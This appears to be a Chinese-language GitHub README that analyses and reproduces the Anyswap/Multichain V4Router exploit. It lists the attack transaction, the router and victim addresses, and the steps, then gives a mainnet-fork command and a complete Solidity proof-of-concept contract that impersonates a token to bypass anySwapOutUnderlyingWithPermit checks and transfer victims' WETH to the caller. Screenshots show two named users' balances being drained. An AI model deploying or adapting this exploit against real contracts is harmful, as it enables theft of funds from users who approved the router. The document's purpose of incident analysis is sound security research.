# Anyswap_Vul_Poc
Anyswap aka Multichain V4Router 攻击事件的分析和复现


### 攻击交易

```
0xd07c0f40eec44f7674dddf617cbdec4758f258b531e99b18b8ee3b3b95885e7d
```

### 块高度

```
14028474
```


### 相关地址

{
    "0x6b7a87899490ece95443e979ca9485cbe7e71522": "AnyswapV4Router",
    "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2": "WETH",
    "0x0000000000000000000000000000000000000000": "0x0000...0000"
    "0x5136e623126d3572933fbafe59ae97f13dd9687a": "Innoncent User1",
    "0xa8a83c0a6fabadf21dbb1da1d9b24455c56f5573": "Innoncent User2"
}

### 攻击步骤

1. 攻击合约调用`AnyswapV4Router`的`anySwapOutUnderlyingWithPermit`函数,传入参数：
    1. 受害者地址
    2. 虚假的Token地址
    3. 攻击者的EOA地址
    4. amount=200000000000000000
    5. deadline=100000000000000000000
    6. v=0
    7. r=0x0000000000000000000000000000000000000000000000000000000000000000
    8. s=0x0000000000000000000000000000000000000000000000000000000000000000
    9. toChainID=56

2. 第一步会导致`AnyswapV4Router`调用虚假Token的`underlying()`函数, 虚假Token的返回值为：
    1. WETH的地址


3. 第一步中`AnyswapV4Router`还会调用虚假Token的`depositVault()`函数, 虚假Token的返回值为：
    1. 1


4. 第一步`AnyswapV4Router`最后会调用虚假Token的`burn()`函数, 虚假Token的返回值为：
    1. true

5. 绕过各种校验后, AnyswapV4Router把`WETH`从受害人的账户转入攻击者的EOA地址


### 复现方法

* fork

```
npx ganache-cli  --fork https://eth-mainnet.alchemyapi.io/v2/your_api_key@14028473  -l 4294967295
```

* 部署攻击合约

```js

// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.7.0 <0.9.0;

interface AnyswapV4Router {

    function anySwapOutUnderlyingWithPermit(
        address from,
        address token,
        address to,
        uint256 amount,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s,
        uint256 toChainID
    ) external;
    
}

interface WBNB {

    function approve(address guy, uint256 wad) external returns (bool);

    function withdraw(uint256 wad) external;

    function balanceOf(address) external view returns (uint256);

    function transfer(address dst, uint256 wad) external returns (bool);

}



contract poc{

    address AnyswapV4Router_Address = 0x6b7a87899490EcE95443e979cA9485CBE7E71522;

    address WBNB_Address = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    function attack(address innocent_user, uint256 amount) public{

        AnyswapV4Router(AnyswapV4Router_Address).anySwapOutUnderlyingWithPermit(innocent_user,address(this),msg.sender,amount,100000000000000000000,0,"0x","0x",56);

        WBNB(WBNB_Address).transfer(msg.sender, amount);

    }


    function burn(address from, uint256 amount) external returns (bool){
        return true;
    }

    function depositVault(uint amount, address to) external returns (uint){
        return 1;
    }


    function underlying() external view returns (address){
        return WBNB_Address;
    }

}


```

* 查询第一个受害者有多少`WETH`

![image](https://github.com/W2Ning/Anyswap_Vul_Poc/blob/main/images/innocent_user_1.png)

该用户`0x5136e623126d3572933fbafe59ae97f13dd9687a`有大概5.7个`WETH`

* 调用POC合约的`attack`函数, 传入第一个受害人的地址和数量

![image](https://github.com/W2Ning/Anyswap_Vul_Poc/blob/main/images/attack_1.png)


![image](https://github.com/W2Ning/Anyswap_Vul_Poc/blob/main/images/after.png)

* 查询第二个受害者有多少`WETH`

![image](https://github.com/W2Ning/Anyswap_Vul_Poc/blob/main/images/innocent_user_2.png)

该用户`0xa8a83c0a6fabadf21dbb1da1d9b24455c56f5573`刚好有3个`WETH`, 并且之前与`Anyswap`交互过

* 同样的操作

![image](https://github.com/W2Ning/Anyswap_Vul_Poc/blob/main/images/attack_2.png)


![image](https://github.com/W2Ning/Anyswap_Vul_Poc/blob/main/images/after_attack_2.png)

